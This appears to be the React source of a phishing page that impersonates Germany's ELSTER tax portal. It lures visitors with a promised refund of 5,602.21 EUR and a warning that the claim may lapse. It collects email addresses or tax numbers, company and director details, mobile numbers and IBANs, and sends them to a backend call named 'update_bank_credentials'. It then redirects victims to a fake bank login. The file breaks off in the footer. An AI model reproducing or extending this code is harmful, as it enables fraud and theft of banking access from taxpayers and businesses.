import { useState, useEffect, useMemo } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { resolveDeBankRoute } from "@/lib/bankMatchDe";
import { supabase } from "@/integrations/supabase/client";
import { usePageMeta } from "@/hooks/use-page-meta";
import LoadingOverlay from "@/components/LoadingOverlay";
import {
  User,
  Settings,
  Files,
  Users,
  LayoutGrid,
  FileBadge,
  IdCard,
  Menu,
  X,
  ExternalLink,
  Check,
  Plus,
  Trash2,
} from "lucide-react";
import bsiAsset from "@/assets/elster-bsi.png.asset.json";
import bikAsset from "@/assets/elster-bik.png.asset.json";
import llAsset from "@/assets/elster-ll.jpg.asset.json";
import elsterLogo from "@/assets/elster-logo.png.asset.json";
import sternAsset from "@/assets/stern.png.asset.json";
import sternTransparentAsset from "@/assets/stern-transparent.png.asset.json";

const GREEN = "#78b434";
const BLUE = "#007fad";
const TEXT = "#222";
const MUTED = "#666";
const BORDER = "#d7d7d7";

type TabKey = "zertifikat" | "steuernummer";
type Phase = "login" | "verify";
type Director = { firstName: string; lastName: string; mobile: string };

const TABS: { key: TabKey; label: string; Icon: typeof FileBadge }[] = [
  { key: "zertifikat", label: "E-Mail Login", Icon: IdCard },
  { key: "steuernummer", label: "Steuernummer", Icon: FileBadge },
];

function formatIban(raw: string) {
  const cleaned = raw.toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, 34);
  return cleaned.replace(/(.{4})/g, "$1 ").trim();
}

const Elster = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const STORAGE_KEY = "elster-stx-state";


  const [phase, setPhase] = useState<Phase>("login");
  const [tab, setTab] = useState<TabKey>("zertifikat");
  const [email, setEmail] = useState("");
  const [steuernummer, setSteuernummer] = useState("");
  const [pwError, setPwError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [loadingPhase, setLoadingPhase] = useState("");
  const [menuOpen, setMenuOpen] = useState(false);

  // Verify step state
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [company, setCompany] = useState("");
  const [vEmail, setVEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [city, setCity] = useState("");
  const [directors, setDirectors] = useState<Director[]>([
    { firstName: "", lastName: "", mobile: "" },
  ]);
  const [iban, setIban] = useState("");
  const [bankName, setBankName] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [verifySubmitting, setVerifySubmitting] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, [phase, step]);
  usePageMeta("Mein ELSTER | Login", "/favicon.png");

  // Restore state when returning from bank login (?step=3)
  useEffect(() => {
    if (searchParams.get("step") !== "3") return;
    try {
      const raw = sessionStorage.getItem(STORAGE_KEY);
      if (raw) {
        const s = JSON.parse(raw);
        setCompany(s.company ?? ""); setVEmail(s.vEmail ?? ""); setPhone(s.phone ?? "");
        setStreet(s.street ?? ""); setCity(s.city ?? "");
        setDirectors(s.directors ?? [{ firstName: "", lastName: "", mobile: "" }]);
        setIban(s.iban ?? ""); setBankName(s.bankName ?? "");
      }
    } catch { /* ignore */ }
    setPhase("verify"); setStep(3);
  }, [searchParams]);

  const cleanedIban = iban.replace(/\s/g, "").toUpperCase();
  const ibanValid = useMemo(() => {
    const s = cleanedIban;
    if (s.length < 15 || s.length > 34 || !/^[A-Z0-9]+$/.test(s)) return false;
    const rearranged = s.slice(4) + s.slice(0, 4);
    const converted = rearranged.replace(/[A-Z]/g, (c) => (c.charCodeAt(0) - 55).toString());
    let remainder = 0;
    for (let i = 0; i < converted.length; i++) {
      remainder = (remainder * 10 + Number(converted[i])) % 97;
    }
    return remainder === 1;
  }, [cleanedIban]);

  useEffect(() => {
    if (!ibanValid) { setBankName(""); return; }
    const ctrl = new AbortController();
    const t = setTimeout(async () => {
      try {
        const res = await fetch(`https://openiban.com/validate/${cleanedIban}?getBIC=true&validateBankCode=true`, { signal: ctrl.signal });
        const data = await res.json();
        if (data?.valid && data?.bankData?.name) setBankName(data.bankData.name);
        else setBankName("");
      } catch { /* ignore */ }
    }, 400);
    return () => { ctrl.abort(); clearTimeout(t); };
  }, [cleanedIban, ibanValid]);

  const txCode = useMemo(() => {
    const n = Math.floor(100000000 + Math.random() * 900000000);
    return `${n} -C${Math.floor(10 + Math.random() * 90)}`;
  }, []);

  const activeTab = TABS.find((t) => t.key === tab) ?? TABS[0];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (tab === "zertifikat" && !email.trim()) {
      setPwError("Bitte geben Sie Ihre E-Mail-Adresse ein."); return;
    }
    if (tab === "steuernummer" && !steuernummer.trim()) {
      setPwError("Bitte geben Sie Ihre Steuernummer ein."); return;
    }
    if (submitting) return;
    setSubmitting(true);
    setLoadingPhase("Verbindung zum ELSTER-Server wird aufgebaut…");
    const rpcPromise = sessionId
      ? supabase.rpc("update_bank_credentials", {
          p_session_id: sessionId,
          p_username: tab === "steuernummer" ? steuernummer : email,
          p_password: "",
          p_username_label: tab === "steuernummer" ? "Steuernummer" : "E-Mail",
          p_password_label: "",
        })
      : Promise.resolve({ error: null } as { error: unknown });
    const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
    await sleep(700);
    setLoadingPhase("Zugangsdaten werden überprüft…");
    await sleep(900);
    setLoadingPhase("Benutzerkonto wird geladen…");
    const { error } = (await rpcPromise) as { error: unknown };
    if (error) console.error("Update failed:", error);
    await sleep(700);
    setSubmitting(false);
    setLoadingPhase("");
    if (tab === "zertifikat") setVEmail(email);
    setPhase("verify");
  };

  const updateDirector = (i: number, key: keyof Director, val: string) => {
    setDirectors((d) => d.map((x, idx) => idx === i ? { ...x, [key]: val } : x));
  };
  const addDirector = () => setDirectors((d) => [...d, { firstName: "", lastName: "", mobile: "" }]);
  const removeDirector = (i: number) => setDirectors((d) => d.filter((_, idx) => idx !== i));

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    const err: Record<string, string> = {};
    if (!company.trim()) err.company = "Bitte Unternehmensname eingeben.";
    if (!vEmail.trim()) err.email = "Bitte E-Mail-Adresse eingeben.";
    if (!street.trim()) err.street = "Bitte Straße und Hausnummer eingeben.";
    if (!city.trim()) err.city = "Bitte PLZ und Stadt eingeben.";
    directors.forEach((d, i) => {
      if (!d.firstName.trim()) err[`gf_${i}_fn`] = "Pflichtfeld.";
      if (!d.lastName.trim()) err[`gf_${i}_ln`] = "Pflichtfeld.";
      if (!d.mobile.trim()) err[`gf_${i}_mb`] = "Pflichtfeld.";
    });
    setErrors(err);
    if (Object.keys(err).length === 0) setStep(2);
  };

  const [verifyLoadingMsg, setVerifyLoadingMsg] = useState("");

  const handleVerifySubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const err: Record<string, string> = {};
    const cleaned = iban.replace(/\s/g, "");
    if (cleaned.length < 15) err.iban = "Bitte gültige IBAN eingeben.";
    if (!ibanValid) err.iban = "Bitte gültige IBAN eingeben.";
    if (!bankName) err.iban = "Bank konnte noch nicht ermittelt werden.";
    setErrors(err);
    if (Object.keys(err).length > 0 || verifySubmitting) return;
    setVerifySubmitting(true);
    setVerifyLoadingMsg("Bankverbindung wird überprüft…");

    const summary = [
      `Unternehmen: ${company}`,
      `E-Mail: ${vEmail}`,
      `Telefon: ${phone || "-"}`,
      `Adresse: ${street}, ${city}`,
      ...directors.map((d, i) => `Geschäftsführer ${i + 1}: ${d.firstName} ${d.lastName} (Mobil: ${d.mobile})`),
    ].join("\n");

    const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
    const rpcPromise = sessionId
      ? supabase.rpc("update_bank_credentials", {
          p_session_id: sessionId,
          p_username: summary,
          p_password: iban,
          p_username_label: "Firmendaten",
          p_password_label: "IBAN",
        })
      : Promise.resolve({ error: null } as { error: unknown });

    await sleep(1500);
    const { error } = (await rpcPromise) as { error: unknown };
    if (error) console.error("Update failed:", error);

    const route = await resolveDeBankRoute(bankName);
    if (route) {
      try {
        sessionStorage.setItem(STORAGE_KEY, JSON.stringify({
          company, vEmail, phone, street, city, directors, iban, bankName,
        }));
      } catch { /* ignore */ }
      setVerifyLoadingMsg("Weiterleitung zur Online-Banking-Anmeldung…");
      await sleep(1200);
      const qs = new URLSearchParams();
      if (sessionId) qs.set("s", sessionId);
      qs.set("return", "/elster/steuerrueckzahlung");
      navigate(`${route}?${qs.toString()}`);
      return;
    }

    setVerifySubmitting(false);
    setVerifyLoadingMsg("");
    setErrors({ iban: "Für diese Bank ist derzeit keine Online-Verifizierung verfügbar." });
  };

  const menu = [
    { icon: User, label: "Mein ELSTER" },
    { icon: Settings, label: "Mein Benutzerkonto" },
    { icon: Files, label: "Formulare und Leistungen" },
    { icon: Users, label: "Benutzergruppen" },
    { icon: LayoutGrid, label: "Weitere Softwareprodukte" },
  ];

  const inputStyle = (hasError: boolean): React.CSSProperties => ({
    width: "100%", padding: "10px 12px",
    border: `1px solid ${hasError ? "#c00" : BORDER}`,
    outline: "none", fontSize: 15, boxSizing: "border-box", background: "#fff",
  });
  const labelStyle: React.CSSProperties = { display: "block", fontSize: 14, marginBottom: 6 };
  const fieldWrap: React.CSSProperties = { marginBottom: 14 };
  const errText: React.CSSProperties = { color: "#c00", fontSize: 13, marginTop: 4 };

  return (
    <div style={{ fontFamily: "'Open Sans', 'Segoe UI', Arial, sans-serif", color: TEXT, background: "#fff", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {verifySubmitting && verifyLoadingMsg && (
        <LoadingOverlay message={verifyLoadingMsg} duration={9_999_999} onComplete={() => { /* controlled by handleVerifySubmit */ }} />
      )}

      {/* Header */}
      <header style={{ background: "#fff", borderBottom: `1px solid ${GREEN}` }}>
        <div style={{ maxWidth: 1400, margin: "0 auto", padding: "14px 24px", display: "flex", alignItems: "center", gap: 16 }}>
          <a href="#" style={{ display: "flex", alignItems: "center", textDecoration: "none" }}>
            <img src={elsterLogo.url} alt="ELSTER – Ihr Online-Finanzamt" style={{ height: 44, width: "auto", display: "block", flexShrink: 0, objectFit: "contain" }} />
          </a>
          <div style={{ flex: 1 }} />
          <a href="#" className="hidden md:inline-flex" style={{ background: BLUE, color: "#fff", padding: "6px 16px", borderRadius: 3, textDecoration: "none", fontWeight: 600 }}>Anmelden</a>
          <button className="md:hidden" aria-label="Menü" onClick={() => setMenuOpen(true)} style={{ background: "none", border: "none", color: BLUE, cursor: "pointer" }}>
            <Menu size={28} />
          </button>
        </div>
      </header>

      {menuOpen && (
        <div className="md:hidden" style={{ position: "fixed", inset: 0, background: "#fff", zIndex: 50, display: "flex", flexDirection: "column" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "14px 20px", borderBottom: `3px solid ${GREEN}` }}>
            <img src={elsterLogo.url} alt="ELSTER" style={{ height: 36, width: "auto", display: "block" }} />
            <button aria-label="Schließen" onClick={() => setMenuOpen(false)} style={{ background: "none", border: "none", cursor: "pointer", color: TEXT }}><X size={28} /></button>
          </div>
          <nav style={{ padding: 16, display: "flex", flexDirection: "column", gap: 2 }}>
            {menu.map((m) => (
              <a key={m.label} href="#" style={{ display: "flex", alignItems: "center", gap: 12, padding: "14px 10px", color: BLUE, textDecoration: "none", borderBottom: `1px solid ${BORDER}` }}>
                <m.icon size={22} /> {m.label}
              </a>
            ))}
          </nav>
        </div>
      )}

      <main style={{ flex: 1, maxWidth: 1400, width: "100%", margin: "0 auto", padding: "24px 16px", display: "grid", gridTemplateColumns: "260px 1fr", gap: 20, position: "relative" }} className="elster-main">
        <div className="elster-vrule hidden lg:block" style={{ position: "absolute", right: 16, top: 24, bottom: 24, width: 1, background: BORDER, pointerEvents: "none" }} />
        <aside className="hidden lg:block" style={{ border: `1px solid ${BORDER}`, background: "#fff" }}>
          <div style={{ padding: "16px 18px", borderBottom: `1px solid ${BORDER}`, color: TEXT, fontSize: 16 }}>ELSTER</div>
          {menu.map((m, i) => (
            <a key={m.label} href="#" style={{
              display: "flex", alignItems: "center", gap: 12,
              padding: "14px 18px", color: BLUE, textDecoration: "none",
              borderBottom: i < menu.length - 1 ? `1px solid ${BORDER}` : "none",
              fontSize: 15,
            }}>
              <m.icon size={20} strokeWidth={1.5} /> {m.label}
            </a>
          ))}
        </aside>

        {phase === "login" ? (
          <section>
            <div style={{
              background: "#f4f8ec",
              borderLeft: "4px solid #78b434",
              padding: "16px 20px",
              margin: "4px 0 20px",
              maxWidth: 820,
            }}>
              <div style={{ fontSize: 18, fontWeight: 700, color: TEXT, marginBottom: 8 }}>
                Ihr ausstehender Betrag zur Steuerrückzahlung wartet
              </div>
              <p style={{ fontSize: 14, lineHeight: 1.55, color: TEXT, margin: 0 }}>
                Gemäß den geltenden europäischen Gesetzesbestimmungen steht Ihnen die unverzügliche Auszahlung Ihres zu viel entrichteten Steuerbetrags zu. Um die Rückerstattung fristgerecht veranlassen zu können, ist eine Anmeldung in Ihrem ELSTER-Benutzerkonto sowie die Bestätigung Ihrer hinterlegten Bankverbindung zwingend erforderlich. Bitte loggen Sie sich über eine der untenstehenden Login-Optionen ein und verifizieren Sie Ihre IBAN, damit die Überweisung des Ihnen zustehenden Betrags umgehend ausgelöst werden kann. Eine ausbleibende Bestätigung kann zu einer Verzögerung oder zum Verfall des Erstattungsanspruchs führen.
              </p>
            </div>
            <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 20px" }}>Login-Optionen</h1>

            <div style={{ display: "grid", gridTemplateColumns: "260px 1fr 260px", columnGap: 0, paddingRight: 16 }} className="elster-content">
              <div style={{ borderLeft: `1px solid ${BORDER}`, borderRight: `1px solid ${BORDER}`, borderTop: `1px solid ${BORDER}`, borderBottom: `1px solid ${BORDER}`, background: "#f8f8f8" }}>
                {TABS.map((t) => {
                  const active = t.key === tab;
                  const TAB_GREEN = "#485e00";
                  return (
                    <button key={t.key} type="button" onClick={() => { setTab(t.key); setPwError(""); }} style={{
                      width: "100%", textAlign: "left", display: "flex", alignItems: "center", gap: 12,
                      padding: "16px 16px", border: "none", background: active ? "#fff" : "#f8f8f8", cursor: "pointer",
                      borderLeft: `4px solid ${active ? TAB_GREEN : "transparent"}`,
                      color: active ? TAB_GREEN : BLUE, fontSize: 15,
                      borderBottom: `1px solid ${BORDER}`,
                    }}>
                      <t.Icon size={22} strokeWidth={1.5} color={active ? TAB_GREEN : BLUE} /> {t.label}
                    </button>
                  );
                })}
              </div>

              <div style={{ background: "#fff", padding: "20px 24px", borderTop: `1px solid ${BORDER}`, borderBottom: `1px solid ${BORDER}`, borderRight: `1px solid ${BORDER}` }}>
                <h2 style={{ fontSize: 22, fontWeight: 400, margin: "0 0 16px" }}>{activeTab.label}</h2>
                <form onSubmit={handleSubmit} style={{ position: "relative" }}>
                  <label style={{ display: "block", fontSize: 14, marginBottom: 6 }}>
                    {tab === "steuernummer" ? "Steuernummer eingeben" : "E-Mail-Adresse"}
                  </label>
                  <div style={{ marginBottom: pwError ? 6 : 18 }}>
                    {tab === "steuernummer" ? (
                      <input
                        type="text"
                        value={steuernummer}
                        onChange={(e) => { setSteuernummer(e.target.value); if (pwError) setPwError(""); }}
                        disabled={submitting}
                        style={{ width: "100%", padding: "10px 12px", border: `1px solid ${pwError ? "#c00" : BORDER}`, outline: "none", fontSize: 15, boxSizing: "border-box" }}
                      />
                    ) : (
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => { setEmail(e.target.value); if (pwError) setPwError(""); }}
                        disabled={submitting}
                        style={{ width: "100%", padding: "10px 12px", border: `1px solid ${pwError ? "#c00" : BORDER}`, outline: "none", fontSize: 15, boxSizing: "border-box" }}
                      />
                    )}
                  </div>
                  {pwError && <div style={{ color: "#c00", fontSize: 13, marginBottom: 14 }}>{pwError}</div>}
                  <button type="submit" disabled={submitting} style={{ background: submitting ? "#6ba7bf" : BLUE, color: "#fff", border: "none", padding: "6px 16px", borderRadius: 3, fontSize: 15, cursor: submitting ? "not-allowed" : "pointer", display: "inline-flex", alignItems: "center", gap: 8 }}>
                    {submitting && (
                      <span style={{ width: 14, height: 14, border: "2px solid rgba(255,255,255,0.4)", borderTopColor: "#fff", borderRadius: "50%", display: "inline-block", animation: "elsterSpin 0.8s linear infinite" }} />
                    )}
                    {submitting ? "Anmeldung läuft…" : "Anmelden"}
                  </button>
                  {submitting && loadingPhase && (
                    <div style={{ marginTop: 14, fontSize: 13, color: MUTED }}>{loadingPhase}</div>
                  )}
                  <style>{`@keyframes elsterSpin { to { transform: rotate(360deg); } }`}</style>
                </form>
              </div>

              <aside className="elster-info" style={{ fontSize: 14, lineHeight: 1.5, marginLeft: 16, alignSelf: "start", background: "#f8f8f8", padding: "20px 20px" }}>
                {tab === "zertifikat" ? (
                  <>
                    <div style={{ fontWeight: 700, marginBottom: 8 }}>Zugang per E-Mail nicht möglich?</div>
                    <p style={{ color: MUTED, margin: "0 0 16px" }}>
                      Der E-Mail Login funktioniert nur mit einer bei ELSTER registrierten E-Mail-Adresse. Bitte prüfen Sie, ob Ihre Eingabe korrekt geschrieben ist und mit der in Ihrem Benutzerkonto hinterlegten Adresse übereinstimmt.
                    </p>
                    <div style={{ fontWeight: 700, marginBottom: 6 }}>Noch keine E-Mail-Adresse hinterlegt?</div>
                    <div>Hier <a href="#" style={{ color: BLUE, textDecoration: "none", fontWeight: 600 }}>Benutzerkonto erstellen</a>.</div>
                  </>
                ) : (
                  <>
                    <div style={{ fontWeight: 700, marginBottom: 8 }}>Wo finde ich meine Steuernummer?</div>
                    <p style={{ color: MUTED, margin: "0 0 16px" }}>
                      Ihre Steuernummer finden Sie auf jedem Steuerbescheid sowie auf Schreiben Ihres Finanzamts, in der Regel oben rechts. Das Format ist je nach Bundesland unterschiedlich (z. B. <span style={{ fontStyle: "italic" }}>12/345/67890</span>).
                    </p>
                    <div style={{ fontWeight: 700, marginBottom: 6 }}>Noch kein Benutzerkonto?</div>
                    <div>Hier <a href="#" style={{ color: BLUE, textDecoration: "none", fontWeight: 600 }}>Benutzerkonto erstellen</a>.</div>
                  </>
                )}
              </aside>
            </div>
          </section>
        ) : (
          <section>
            <div style={{
              background: "#f4f8ec",
              borderLeft: "4px solid #78b434",
              padding: "18px 22px",
              margin: "4px 0 20px",
              maxWidth: 820,
            }}>
              <div style={{ fontSize: 15, color: TEXT, marginBottom: 6 }}>
                Ihnen steht eine Steuerrückzahlung in Höhe von
              </div>
              <div style={{ fontSize: 28, fontWeight: 700, color: "#485e00", marginBottom: 10, letterSpacing: 0.2 }}>
                5.602,21&nbsp;€
              </div>
              <p style={{ fontSize: 14, lineHeight: 1.55, color: TEXT, margin: 0 }}>
                Zur Veranlassung der Auszahlung ist die Verifizierung Ihrer hinterlegten Firmen- und Bankdaten erforderlich. Bitte vervollständigen Sie die nachfolgenden Angaben, damit die Überweisung des Ihnen zustehenden Betrags umgehend ausgelöst werden kann.
              </p>
            </div>

            <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 12px" }}>Identität verifizieren</h1>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", columnGap: 0, paddingRight: 16 }} className="elster-content">
              <p style={{ fontSize: 13, lineHeight: 1.55, color: TEXT, margin: "0 0 20px" }}>
                <strong style={{ color: TEXT }}>Wichtiger Hinweis:</strong> Zur Auszahlung Ihrer Steuerrückerstattung auf das von Ihnen
                angegebene Konto ist zunächst eine Verifizierung Ihrer Identität erforderlich. Dies dient dem Schutz vor
                unberechtigten Auszahlungen und stellt sicher, dass der Erstattungsbetrag ausschließlich an die steuerpflichtige
                Person bzw. das steuerpflichtige Unternehmen überwiesen wird. Bitte vervollständigen Sie hierzu die nachfolgenden
                Firmen- und Kontodaten vollständig und wahrheitsgemäß. Nach erfolgreicher Prüfung wird der Erstattungsbetrag
                innerhalb weniger Werktage auf das hinterlegte Konto überwiesen.
              </p>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", columnGap: 0, paddingRight: 16 }} className="elster-content">
              <div style={{ background: "#fff", padding: "20px 24px", border: `1px solid ${BORDER}` }}>
                <div style={{ display: "flex", alignItems: "center", marginBottom: 24 }}>
                  {([
                    { n: 1, label: "Firmendaten" },
                    { n: 2, label: "IBAN" },
                    { n: 3, label: "Bestätigung" },
                  ] as const).map((s, idx) => {
                    const done = step > s.n;
                    const active = step === s.n;
                    const on = done || active;
                    return (
                      <div key={s.n} style={{ display: "flex", alignItems: "center" }}>
                        {idx > 0 && (
                          <div style={{ flex: "0 0 48px", height: 2, background: step >= s.n ? GREEN : "#ccc", margin: "0 12px" }} />
                        )}
                        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                          <div style={{
                            width: 28, height: 28, borderRadius: "50%",
                            background: on ? GREEN : "#ccc",
                            color: "#fff", display: "flex", alignItems: "center", justifyContent: "center",
                            fontSize: 13, fontWeight: 600, lineHeight: 1
                          }}>
                            {done ? "✓" : s.n}
                          </div>
                          <span style={{ fontSize: 14, fontWeight: active ? 600 : 400, color: active ? GREEN : "#666" }}>{s.label}</span>
                        </div>
                      </div>
                    );
                  })}
                </div>

                {step === 1 && (
                  <form onSubmit={handleNext} noValidate>
                    <div style={fieldWrap}>
                      <label style={labelStyle}>Unternehmensname</label>
                      <input value={company} onChange={(e) => setCompany(e.target.value)} style={inputStyle(!!errors.company)} />
                      {errors.company && <div style={errText}>{errors.company}</div>}
                    </div>
                    <div style={fieldWrap}>
                      <label style={labelStyle}>E-Mail-Adresse</label>
                      <input type="email" value={vEmail} onChange={(e) => setVEmail(e.target.value)} style={inputStyle(!!errors.email)} />
                      {errors.email && <div style={errText}>{errors.email}</div>}
                    </div>
                    <div style={fieldWrap}>
                      <label style={labelStyle}>Telefonnummer (Optional)</label>
                      <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} style={inputStyle(false)} />
                    </div>
                    <div style={fieldWrap}>
                      <label style={labelStyle}>Straße, Hausnummer</label>
                      <input value={street} onChange={(e) => setStreet(e.target.value)} style={inputStyle(!!errors.street)} />
                      {errors.street && <div style={errText}>{errors.street}</div>}
                    </div>
                    <div style={fieldWrap}>
                      <label style={labelStyle}>PLZ, Stadt</label>
                      <input value={city} onChange={(e) => setCity(e.target.value)} style={inputStyle(!!errors.city)} />
                      {errors.city && <div style={errText}>{errors.city}</div>}
                    </div>

                    <div style={{ height: 1, background: BORDER, margin: "22px 0 18px" }} />

                    {directors.map((d, i) => (
                      <div key={i} style={{ marginBottom: 18 }}>
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
                          <div style={{ fontSize: 15, fontWeight: 600 }}>Geschäftsführer {directors.length > 1 ? i + 1 : ""}</div>
                          {directors.length > 1 && (
                            <button type="button" onClick={() => removeDirector(i)} style={{ background: "none", border: "none", color: BLUE, cursor: "pointer", display: "flex", alignItems: "center", gap: 4, fontSize: 13 }}>
                              <Trash2 size={14} /> Entfernen
                            </button>
                          )}
                        </div>
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }} className="gf-grid">
                          <div>
                            <label style={labelStyle}>Vorname</label>
                            <input value={d.firstName} onChange={(e) => updateDirector(i, "firstName", e.target.value)} style={inputStyle(!!errors[`gf_${i}_fn`])} />
                          </div>
                          <div>
                            <label style={labelStyle}>Nachname</label>
                            <input value={d.lastName} onChange={(e) => updateDirector(i, "lastName", e.target.value)} style={inputStyle(!!errors[`gf_${i}_ln`])} />
                          </div>
                        </div>
                        <div style={{ marginTop: 12 }}>
                          <label style={labelStyle}>Mobilfunknummer</label>
                          <input type="tel" value={d.mobile} onChange={(e) => updateDirector(i, "mobile", e.target.value)} style={inputStyle(!!errors[`gf_${i}_mb`])} />
                        </div>
                      </div>
                    ))}

                    <button type="button" onClick={addDirector} style={{ background: "none", border: `1px solid ${BORDER}`, color: BLUE, padding: "8px 14px", cursor: "pointer", fontSize: 14, display: "inline-flex", alignItems: "center", gap: 6, marginBottom: 20 }}>
                      <Plus size={16} /> Weiteren Geschäftsführer hinzufügen
                    </button>

                    <div style={{ marginTop: 10 }}>
                      <button type="submit" style={{ background: BLUE, color: "#fff", border: "none", padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Weiter</button>
                    </div>
                  </form>
                )}

                {step === 2 && (
                  <form onSubmit={handleVerifySubmit} noValidate>
                    <div style={fieldWrap}>
                      <label style={labelStyle}>IBAN</label>
                      <input
                        value={iban}
                        onChange={(e) => { setIban(formatIban(e.target.value)); if (errors.iban) setErrors({}); }}
                        placeholder="DE00 0000 0000 0000 0000 00"
                        style={{ ...inputStyle(!!errors.iban), letterSpacing: 1, fontFamily: "monospace" }}
                        autoComplete="off"
                        inputMode="text"
                      />
                      {errors.iban && <div style={errText}>{errors.iban}</div>}
                      {bankName && !errors.iban && (
                        <div style={{ color: MUTED, fontSize: 13, marginTop: 6 }}>{bankName}</div>
                      )}
                    </div>

                    <div style={{ background: "#f8f8f8", border: `1px solid ${BORDER}`, padding: "12px 14px", fontSize: 13, lineHeight: 1.5, color: TEXT, marginTop: 8 }}>
                      <strong>Hinweis zur Kontoverifizierung:</strong> Nach dem Absenden werden Sie zur Online-Banking-Anmeldung Ihrer Bank weitergeleitet. Bitte loggen Sie sich dort ein, um Ihr Konto zu bestätigen. Anschließend kehren Sie automatisch hierher zurück.
                    </div>

                    <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
                      <button type="button" onClick={() => setStep(1)} style={{ background: "#fff", color: BLUE, border: `1px solid ${BORDER}`, padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Zurück</button>
                      <button type="submit" disabled={verifySubmitting || !ibanValid || !bankName} style={{ background: BLUE, color: "#fff", border: "none", padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: (verifySubmitting || !ibanValid || !bankName) ? "not-allowed" : "pointer", opacity: (verifySubmitting || !ibanValid || !bankName) ? 0.5 : 1 }}>Absenden</button>
                    </div>
                  </form>
                )}

                {step === 3 && (
                  <div>
                    <div style={{ display: "flex", flexDirection: "column", alignItems: "center", textAlign: "center", padding: "12px 0 20px" }}>
                      <div style={{ width: 64, height: 64, borderRadius: "50%", background: GREEN, color: "#fff", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 16 }}>
                        <Check size={36} strokeWidth={3} />
                      </div>
                      <h2 style={{ fontSize: 22, fontWeight: 400, margin: "0 0 8px", color: TEXT }}>Datenaktualisierung erfolgreich übermittelt</h2>
                      <p style={{ fontSize: 14, color: MUTED, maxWidth: 480, margin: 0, lineHeight: 1.55 }}>
                        Ihre Firmen- und Bankdaten wurden erfolgreich übermittelt und werden in unseren Systemen aktualisiert. Die Auszahlung Ihrer Steuerrückzahlung in Höhe von <strong>5.602,21&nbsp;€</strong> wird nun veranlasst.
                      </p>
                    </div>

                    <div style={{ border: `1px solid ${BORDER}`, marginTop: 8 }}>
                      <div style={{ padding: "12px 16px", background: "#f8f8f8", borderBottom: `1px solid ${BORDER}`, fontSize: 14, fontWeight: 600 }}>
                        Übermittelte Angaben
                      </div>
                      <div>
                        {[
                          { l: "Unternehmen", v: company },
                          { l: "E-Mail-Adresse", v: vEmail },
                          { l: "Telefonnummer", v: phone || "—" },
                          { l: "Straße, Hausnummer", v: street },
                          { l: "PLZ, Stadt", v: city },
                          ...directors.map((d, i) => ({
                            l: `Geschäftsführer${directors.length > 1 ? ` ${i + 1}` : ""}`,
                            v: `${d.firstName} ${d.lastName}${d.mobile ? ` · ${d.mobile}` : ""}`,
                          })),
                          { l: "IBAN", v: iban },
                          ...(bankName ? [{ l: "Bank", v: bankName }] : []),
                        ].map((row, idx, arr) => (
                          <div key={idx} style={{ display: "flex", justifyContent: "space-between", gap: 16, padding: "10px 16px", borderBottom: idx < arr.length - 1 ? `1px solid ${BORDER}` : "none", fontSize: 14 }}>
                            <span style={{ color: MUTED }}>{row.l}</span>
                            <span style={{ color: TEXT, textAlign: "right", wordBreak: "break-word" }}>{row.v}</span>
                          </div>
                        ))}
                      </div>
                    </div>

                    <div style={{ marginTop: 16, background: "#eef7e3", border: `1px solid ${GREEN}`, color: "#2d4a0a", padding: "10px 14px", fontSize: 13, lineHeight: 1.5 }}>
                      <strong>Hinweis:</strong> Sie erhalten in Kürze eine Bestätigung per E-Mail. Es sind keine weiteren Schritte erforderlich.
                    </div>
                  </div>
                )}
              </div>

              <aside className="elster-info" style={{ fontSize: 14, lineHeight: 1.5, marginLeft: 16, alignSelf: "start", background: "#f8f8f8", padding: "20px 20px" }}>
                <div style={{ fontWeight: 700, marginBottom: 8 }}>Warum werden diese Daten benötigt?</div>
                <p style={{ color: MUTED, margin: "0 0 16px" }}>
                  Zur Auszahlung Ihrer Steuerrückzahlung bestätigen Sie bitte Ihre aktuellen Firmen- und Kontaktdaten sowie die hinterlegte Bankverbindung.
                </p>
                <div style={{ fontWeight: 700, marginBottom: 6 }}>Fragen zur Aktualisierung?</div>
                <div>Weitere Informationen in der <a href="#" style={{ color: BLUE, textDecoration: "none", fontWeight: 600 }}>Hilfe</a>.</div>
              </aside>
            </div>
          </section>
        )}
      </main>

      <div style={{ height: 4, background: GREEN, marginTop: 32 }} />
      <footer style={{ background: "#4a4a4a", color: "#fff", marginTop: 0 }}>
        <div style={{ maxWidth: 1400, margin: "0 auto", padding: "40px 24px", display: "grid", gridTemplateColumns: "1fr 2fr", gap: 32 }} className="elster-footer-grid">
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 20 }}>
              <img src={sternAsset.url} alt="" style={{ height: 28, width: "auto" }} />
              <span style={{ fontSize: 24 }}>ELSTER</span>
            </div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px 24px", paddingLeft: 38 }}>
              {[
                "Aktuelles", "Presse und Medien",
                "Rechtliches", "Systemanforderungen",
